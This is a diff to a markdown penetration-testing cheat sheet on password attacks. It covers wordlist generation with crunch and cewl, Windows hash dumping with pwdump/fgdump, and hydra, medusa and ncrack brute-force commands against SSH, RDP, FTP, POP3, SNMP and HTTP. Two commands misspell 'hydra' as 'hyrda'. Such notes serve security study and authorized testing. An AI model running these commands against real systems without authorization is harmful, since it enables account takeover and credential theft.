@@ -1,7 +1,19 @@
-### Password file generator
-
-#### crunch: 
-- is a wordlist generator where you can specify a standard character set or a character set you specify.
+- [Password_generator](#Password_generator)
+  - [Crunch](#Crunch)
+ - [Windows](#Windows)
+  - [pwdump](#pwdump)
+  - [WCE](#WCE)
+ - [Password_cracking](#Cracking)
+  - [HTTP](#HTTP)
+  - [RDP](#RDP)
+  - [SNMP](#SNMP)
+  - [SSH](#SSH)
+  - [FTP](#FTP)
+  - [POP3](#POP3)
+ 
+## Password generator
+### Crunch: 
+  - is a wordlist generator where you can specify a standard character set or a character set you specify.
 
 ##### crunch 6 6 1234567890ABCDE -o <file.txt>
   - ***6*** min length
@@ -18,7 +30,7 @@
   - % numeric charset
   - ^ special char include space
 ------------------------------------------------------------------------------------------------------------------------
-### Windows password 
+### Windows  
 
 #### pwdump fgdump
 MS Windows store hased user password in the ***Security account manager (SAM)***
@@ -38,24 +50,24 @@ pwdump and fgdump inject a DLL containning the hash dumping code into the ***Loc
 - cewl <victim_www_url> -d [num] -m [num] -w [file.txt]
 ------------------------------------------------------------------------------------------------------------------------  
   
-### Password Cracking
+### Cracking
 
-#### HTTP Brute force attack
+#### HTTP
 - medusa -h [url] -u [user_name] -p [password_file.txt] -M http
 
-#### RDP Brute force attack
+#### RDP B
 - ncrack -vv --user [user_name] -P [password_file.txt] rdp://[victim_ip]
 
-#### SNMP Brute force attack
+#### SNMP 
 - hydra -P [password-file.txt] -v [victim_ip] snmp
 
-#### SSH Brute force attack
+#### SSH 
 - hydra -l [user_name] -P [password_file.txt] [victim_ip] ssh
 
-#### FTP Brute force attack
+#### FTP 
 - hyrda -L [user_file] -p [password] [victim_ip] ftp
 
-#### POP3 Brute force attack
+#### POP3 
 - hyrda -L [user_file] -P [password_file.txt] [victim_ip] -s [victim_port] -t 50 -I pop3
 
 ##### Usefull flag
